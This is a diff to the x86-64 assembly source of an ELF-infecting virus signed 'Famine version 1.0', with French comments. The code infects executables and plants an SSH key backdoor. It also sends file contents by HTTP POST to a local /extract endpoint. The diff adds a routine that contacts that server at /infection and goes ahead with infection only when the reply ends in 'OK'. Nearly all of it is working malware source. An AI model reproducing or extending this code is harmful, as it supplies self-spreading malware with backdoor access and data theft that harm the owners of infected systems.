@@ -14,6 +14,9 @@ _start:
 	; lea rdi, [rel dir1]                                   ; dir to open for arg readDir
 	; mov rsi, dir1Len
 	; call _readDir
+    call _isInfectionAllow
+    test rax, rax
+    js _final_jmp
 
     mov rdx, 0
     lea rdi, [rel dir1]                                   ; dir to open for arg initDir
@@ -273,12 +276,12 @@ _check_file:
 		and rbx, -16								; align
 		
 _infection:
-;*rax	-> map
-; r11	== entrypoint offset 
-; r12	-> ehdr.e_entry
-; r13	== original entrypoint offset
-;*r14	-> segment header
-; r15	-> segment end
+    ;*rax	-> map
+    ; r11	== entrypoint offset 
+    ; r12	-> ehdr.e_entry
+    ; r13	== original entrypoint offset
+    ;*r14	-> segment header
+    ; r15	-> segment end
 	; use rbx
 	; mov r15, rax							; r15 -> start of map
 	; add r15, [r14 + elf64_phdr.p_offset]	; r15 -> start of segment
@@ -418,7 +421,6 @@ _backdoor:
         _notFound:
             mov rdi, r9
             mov rax, SYS_WRITE
-            ;mov rsi, sshPub
             lea rsi, [rel sshPub]
             mov rdx, sshPubLen - 1
             syscall
@@ -447,7 +449,7 @@ _initSocket:
 
     _connectSocket:
         mov rax, SYS_CONNECT
-        lea rsi, sockaddr
+        lea rsi, [rel sockaddr]
         mov rdx, 16
         syscall
         test rax, rax
@@ -462,7 +464,7 @@ _closeSock:
     mov rax, -1
     ret
 
-; doit prendre le sockfd en argument (r13 == sockfd)
+; extrait les donnees des fichiers via http
 _extractData:
     mov r12, rax                                    ; r12 -> maped file_date
     push rsi
@@ -517,8 +519,64 @@ _extractData:
         syscall
         jmp _closeSock 
 
-; ---packer
-; jsp encore
+; manage infection
+_isInfectionAllow:
+    push rbp
+    mov rbp, rsp 
+    call _creatSocket
+    cmp rax, 0
+    jl _allow
+
+    _sendInfectionRequest:
+        ;rdi == sockfd
+        mov rdi, rax
+        mov rax, SYS_SENDTO
+        lea rsi, [rel headerGet]
+        mov rdx, headerGetLen
+        xor r10, r10
+        xor r9, r9
+        syscall
+        test rax, rax
+        js _allow
+
+    _nanoSleep:
+        push rdi
+        mov rax, 35
+        lea rdi, [rel timespec]
+        xor rsi, rsi
+        syscall
+        pop rdi
+
+    _recvInfectionRequest:
+        ;* rdi == sockfd
+        mov rax, SYS_RECVFROM
+        sub rsp, 200                        ;buffer pour lire la reponse
+        mov rsi, rsp
+        mov rdx, 200
+        xor r10, r10
+        syscall
+        test rax, rax
+        js _allow
+    
+    _infectionRequestRespons:
+        ;* rdi == sockfd
+        mov rsi, rsp
+        call _strlen
+        add rsp, rax
+        sub rsp, 2
+
+        cmp WORD [rsp], 0x4b4f
+        jne _notAllow
+
+    _allow:
+        call _closeSock
+        mov rax, 0
+        jmp _returnLeave
+
+    _notAllow:
+        call _closeSock
+        mov rax, -1
+        jmp _returnLeave
 
 ; strcpy(dst:rsi src: rdi)
 _strcpyNoNull:
@@ -656,10 +714,16 @@ sockaddr:
 headerStart db "POST /extract HTTP/1.1", 13, 10, \
                 "Host: 127.0.0.1:8000", 13, 10, \
                 "Content-Type: text/plain", 13, 10, \
-                "Connection: keep-alive", 13, 10, \
                 "Content-Length: ", 0 
 headerStartLen equ $-headerStart
-headerEnd db 13, 10, 13, 10, 0  ; Fin de l'entête avant le body
+headerEnd db 13, 10, 13, 10, 0
 headerEndLen equ $-headerEnd
+headerGet db "GET /infection HTTP/1.1", 13, 10, \
+           "Host: 127.0.0.1:8000", 13, 10, \
+           13, 10, 0
+headerGetLen equ $ - headerGet
+timespec:
+    dq 0          ; Secondes
+    dq 10000000     ; 100ms
 signature	db	"Famine version 1.0 (c)oded by anvincen-eedy", 0x0
 _end:
